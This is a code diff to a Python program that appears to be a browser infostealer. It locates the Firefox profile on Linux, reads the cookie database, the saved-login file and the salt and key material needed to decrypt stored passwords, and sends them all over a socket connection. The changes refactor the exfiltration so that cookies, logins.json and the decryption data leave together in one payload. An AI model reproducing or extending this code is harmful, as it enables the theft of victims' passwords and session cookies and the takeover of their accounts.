@@ -91,7 +91,7 @@ class FirefoxCookiesGetter(BrowserCookiesGetter):
 
     def GetCookiesInLinux(self):
 
-        # try: 
+        try: 
 
             browserDirectory = self.profileFinder.FindProfileDirectoryInLinux();
             cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite");
@@ -110,9 +110,8 @@ class FirefoxCookiesGetter(BrowserCookiesGetter):
 
             return cookies;
 
-        # except Exception as e:
-        #     print(f"{e} xd")
-        #     return False;
+        except Exception as e:
+            return f"Database is locked {e}";
             
 
 
@@ -186,11 +185,11 @@ class FirefoxPasswordsGetter(BrowserPasswordsGetter):
 class SocketSender(ABC):
 
     @abstractmethod
-    def SendFileData(self):
+    def ExtractDataFromFile(self):
         pass
 
     @abstractmethod
-    def SendPythonData(self):
+    def SendData(self):
         pass
         
 
@@ -219,27 +218,22 @@ class BrowserDataSender(SocketSender):
 
 
 
-    def SendFileData(self, path):
+
+    def ExtractDataFromFile(self, path):
         
         if(not os.path.exists(path)): raise FileNotFoundError("File not exists!");
 
         with open(path, "r") as File:
-            dataFile = File.read();
+            return File.read();
         
-        try:
-            self.__clientSocket.sendall(str(dataFile).encode());
 
-        except Exception as e:
-            print("Error!" + e);
-
-
-    def SendPythonData(self, data={}):
+    def SendData(self, data={}):
         
         try:
             self.__clientSocket.sendall(str(data).encode());
             
         except Exception as e:
-            print("Error! " + e);
+            print(f"Error! {e}");
 
 
     def CloseConnection(self):
@@ -261,26 +255,25 @@ def Main():
     CookiesGetter = FirefoxCookiesGetter(browserSearcher);
     sender = BrowserDataSender(3000);
     
-
-    passwords = FirefoxPasswordsGetter(browserSearcher);
-    cookies = CookiesGetter.GetCookiesInLinux()
-
-    PasswordsGetter = FirefoxPasswordsGetter(browserSearcher)
-    salt, item2, loginsFilePath = PasswordsGetter.GetPasswordInLinux()
+    cookies = CookiesGetter.GetCookiesInLinux();
+    PasswordsGetter = FirefoxPasswordsGetter(browserSearcher);
 
 
+    salt, item2, loginsFilePath = PasswordsGetter.GetPasswordInLinux();
 
 
-    sender.EstablishConnection();
-    sender.SendFileData(loginsFilePath); 
-    sender.SendPythonData(data={
-       "salt": salt,
-       "item2": item2,
+    sender.EstablishConnection()
+    sender.SendData(data={
+        "cookies": cookies,
+        "logins.json": sender.ExtractDataFromFile(loginsFilePath),        
+        "decrypt": {
+            "salt": salt,
+            "item2": item2
+        }
     });
 
 
     sender.CloseConnection();
-
     
 
 
